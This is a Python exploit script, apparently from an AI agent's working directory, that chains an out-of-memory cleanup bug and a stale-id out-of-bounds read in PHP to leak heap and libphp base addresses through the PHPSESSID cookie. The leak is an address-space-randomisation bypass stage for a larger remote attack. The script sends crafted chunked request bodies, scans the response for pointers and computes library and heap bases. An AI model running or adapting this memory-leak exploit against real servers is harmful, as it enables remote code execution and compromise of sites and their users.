#!/usr/bin/env python3
"""Test 9bie's A1(END-cleanup OOM) + B1(stale-id OOB read) leak on any p2s version.

If it leaks, we get chunk base (main bucket) + libphp base, independent of our
stage-1 Set-Cookie leak. This is the alternative stage-1 for versions where ours fails.

usage: python leak9bie.py --port 18111 --zif 0x39b8a0 --dtor 0x487650 [--tries 3]
"""
import os
import argparse, os, subprocess, sys, struct, urllib.parse
from collections import Counter

GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
MAIN_BUCKET_COUNT = 87


def send(body_file, port, path, save, timeout=120):
    cmd = [sys.executable, os.path.join(GH, "gh_pure_chunked_send.py"),
           "--port", str(port), "--body-file", body_file, "--path", path,
           "--timeout", str(timeout), "--save-response", save]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)
    return (r.stdout or "") + (r.stderr or "")


def parse_leak(resp, dtor_offset, zif_offset):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    ptr_max = 0x7FFFFFFFFFFF
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= ptr_max:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no heap pointers in leak window")
    zdtor, _ = counts.most_common(1)[0]
    lib = zdtor - dtor_offset
    buckets, bucket_first = Counter(), {}
    for q, c in counts.items():
        b = q & ~0x1FFFFF
        buckets[b] += c
        bucket_first.setdefault(b, q)
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common() if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
    return dict(decoded=len(dec), zdtor=zdtor, lib=lib,
                buckets=buckets, main_candidates=[b for b, c in cands[:3]],
                zif=lib + zif_offset)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--zif", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--dtor", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--tries", type=int, default=3)
    ap.add_argument("--big", type=int, default=78)
    args = ap.parse_args()

    a1 = os.path.join(GH, "a1_test.bin")
    b1 = os.path.join(GH, "b1_test.bin")
    leak = os.path.join(GH, "leak_test.resp")

    subprocess.run([sys.executable, os.path.join(GH, "gh_pure_mk_a1.py"),
                    "--out", a1, "--big", str(args.big)],
                   capture_output=True, text=True, timeout=60)
    subprocess.run([sys.executable, os.path.join(GH, "gh_pure_mk_leak_b.py"),
                    "--out", b1, "--spec", LEAK_SPEC, "--fake-len", "0xC8000", "--tag"],
                   capture_output=True, text=True, timeout=60)

    for t in range(1, args.tries + 1):
        # fresh worker via rotate-style big OOM (send A1 again)
        o = send(a1, args.port, "/index.php?qqq=1", leak, timeout=180)
        if "status='HTTP/1.1 5" in o or "status='HTTP/1.1 4" in o:
            print(f"  [try {t}] A1 -> {o.strip()}")
        o = send(b1, args.port, "/index.php", leak, timeout=180)
        try:
            resp = open(leak, "rb").read()
            info = parse_leak(resp, args.dtor, args.zif)
            delta = info["lib"] - info["main_candidates"][0] if info["main_candidates"] else -1
            print(f"  [try {t}] LEAK decoded={info['decoded']} zdtor=0x{info['zdtor']:x} "
                  f"lib=0x{info['lib']:x} main={info['main_candidates'][:3]} delta=0x{delta:x}",
                  flush=True)
            print(f"         buckets={[(hex(b), c) for b, c in info['buckets'].most_common(6)]}", flush=True)
            return info
        except Exception as e:
            print(f"  [try {t}] leak FAILED: {e}", flush=True)
    return None


if __name__ == "__main__":
    main()
